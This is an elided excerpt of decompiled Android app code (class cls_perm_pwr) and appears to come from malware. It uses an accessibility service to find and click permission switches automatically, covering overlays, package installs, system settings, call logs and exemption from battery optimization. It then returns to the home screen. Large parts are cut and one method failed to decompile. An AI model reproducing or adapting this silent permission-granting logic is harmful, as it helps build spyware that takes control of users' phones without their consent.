...
public class cls_perm_pwr extends B4AClass.ImplB4AClass implements BA.SubDelegator {
    private static HashMap<String, Method> htSubs;
    public Common __c = null;
    public boolean _isclassfinished = false;
    public JavaObject _getcontext = null;
    ...
    private void innerInitialize(BA BA) throws Exception {
        if (this.f268ba == null) {
            this.f268ba = new BA(BA, this, htSubs, "com.com.androidrr.cls_perm_pwr");
            if (htSubs == null) {
        ...
        if (BA.isShellModeRuntimeCheck(this.f268ba)) {
            getClass().getMethod("_class_globals", cls_perm_pwr.class).invoke(this, null);
        } else {
    ...
    public boolean _candrawoverlays() throws Exception {
        try {
            ...
            Common.LogImpl("616252942", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }
    ...
    public boolean _canrequestpackageinstalls() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616384008", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }
    ...
    public boolean _check_if_notis() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616187404", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }
    ...
    public String _class_globals() throws Exception {
        ...
        this._getcontext = new JavaObject();
    ...
    public String _click_one_switch(List list) throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("615990797", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
    ...
    public String _in_case_system_button1_showing(List list) throws Exception {
        ...
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616121874", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_requestpowermngt()) {
            return "";
        }
    ...
    public boolean _is_perm_requested() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616842763", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return true;
        }
    }
    ...
    public static class ResumableSub_PerformAction extends BA.ResumableSub {
        ...
        public ResumableSub_PerformAction(cls_perm_pwr cls_perm_pwrVar) {
            this.parent = cls_perm_pwrVar;
        }
        ...
        */
        public void resume(anywheresoftware.b4a.BA r7, java.lang.Object[] r8) throws java.lang.Exception {
            ...
            Le:
                ...
                com.com.androidrr.cls_perm_pwr r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                java.lang.String r8 = "616580611"
                java.lang.String r0 = "PerformAction"
                com.com.androidrr.cls_perm_pwr r1 = r6.parent     // Catch: java.lang.Exception -> L9f
            ...
            L2b:
                ...
                com.com.androidrr.cls_perm_pwr r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                anywheresoftware.b4a.keywords.Common r8 = r8.__c     // Catch: java.lang.Exception -> L9f
                java.lang.String r8 = "616580618"
                com.com.androidrr.cls_perm_pwr r0 = r6.parent     // Catch: java.lang.Exception -> L9f
            ...
            L6b:
                r6.state = r1     // Catch: java.lang.Exception -> L9f
                com.com.androidrr.cls_perm_pwr r8 = r6.parent     // Catch: java.lang.Exception -> L9f
                boolean r8 = r8._requestpowermngt()     // Catch: java.lang.Exception -> L9f
                if (r8 == 0) goto L0
                r8 = 6
                r6.state = r8     // Catch: java.lang.Exception -> L9f
                goto L0
            ...
            Laf:
                goto Lae
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.cls_perm_pwr.ResumableSub_PerformAction.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public Common.ResumableSubWrapper _real_checker(String str, String str2, List list, Object obj, JavaObject javaObject) throws Exception {
        ResumableSub_Real_Checker resumableSub_Real_Checker = new ResumableSub_Real_Checker(this, str, str2, list, obj, javaObject);
    ...
    public static class ResumableSub_Real_Checker extends BA.ResumableSub {
        ...
        public ResumableSub_Real_Checker(cls_perm_pwr cls_perm_pwrVar, String str, String str2, List list, Object obj, JavaObject javaObject) {
            this.parent = cls_perm_pwrVar;
            this._strpkg = str;
            this._strevt = str2;
            this._rootinactivewindow = list;
            this._node = obj;
            this._getcontext1 = javaObject;
        }
                ...
                try {
                    switch (this.state) {
                        ...
                        case 3:
                            ...
                            Common.LogImpl("615859714", "Power ----> Real_Checker ", -65536);
                            break;
                        case 4:
                            this.state = 7;
                                    ...
                                    if (_canwritetosystemsettings) {
                                        ...
                                        if (_canrequestpackageinstalls) {
                                            ...
                                            if (_startcalllogperm) {
                                                boolean _requestpowermngt = this.parent._requestpowermngt();
                        ...
                        case 7:
                            this.state = 8;
                            this.parent._getcontext = this._getcontext1;
                            ...
                            Common.LogImpl("615859727", "int_Number_Of_Switches : " + BA.NumberToString(this._int_number_of_switches), 0);
                            break;
                        case 8:
                            this.state = 15;
                        ...
                        case 15:
                            this.state = 20;
                            boolean _requestpowermngt2 = this.parent._requestpowermngt();
                            Common common14 = this.parent.__c;
                            if (_requestpowermngt2) {
                                this.state = 17;
                                break;
                            } else {
                                this.state = 19;
                        ...
                        case 17:
                            ...
                            cls_perm_pwr cls_perm_pwrVar = this.parent;
                            Common common16 = cls_perm_pwrVar.__c;
                            cls_perm_pwrVar._isclassfinished = true;
                            ...
                            AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                            accessibilityEventsListener2.PerformGlobalAction(2);
                        ...
                        case 22:
                            ...
                            Common.LogImpl("615859772", BA.ObjectToString(Common.LastException(this.parent.getActivityBA())), 0);
                            break;
                        case 23:
                            this.state = -1;
                            this.catchState = 0;
    ...
    public String _request_perm() throws Exception {
        try {
            ...
            intentWrapper.Initialize("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", sb.toString());
            intentWrapper.setFlags(1073741824);
            Common.StartActivity(this.f268ba, intentWrapper.getObject());
            return "";
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("616908298", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }

    public boolean _requestpowermngt() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616515090", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return false;
        }
    }
    ...
    public String _returner_to_act() throws Exception {
        try {
            Common.LogImpl("616777218", BA.ObjectToString(Boolean.valueOf(_requestpowermngt())), 0);
            Colors colors = Common.Colors;
            Common.LogImpl("616777220", "returner_To_Act0000", -16776961);
            if (!_requestpowermngt()) {
                return "";
            }
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616777236", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }
    ...
    public String _search_click_in_multiple_switches(List list) throws Exception {
        ...
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616056376", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }
    ...
    public boolean _startcalllogperm() throws Exception {
        ...
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616449546", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        return z;
    }
    ...
    public String _timer_creator() throws Exception {
        try {
            ...
            this.f268ba.setLastException(e);
            Common.LogImpl("616646151", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
            return "";
        }
    }
    ...
    public String _timerchecker_tick() throws Exception {
        try {
            Colors colors = Common.Colors;
            Common.LogImpl("616711682", "Cls_Perm_Pwr timerChecker_Tick", -65536);
        } catch (Exception e) {
            this.f268ba.setLastException(e);
            Common.LogImpl("616711705", BA.ObjectToString(Common.LastException(getActivityBA())), 0);
        }
        if (_requestpowermngt()) {
            this._timer_checker.setEnabled(false);
            _returner_to_act();
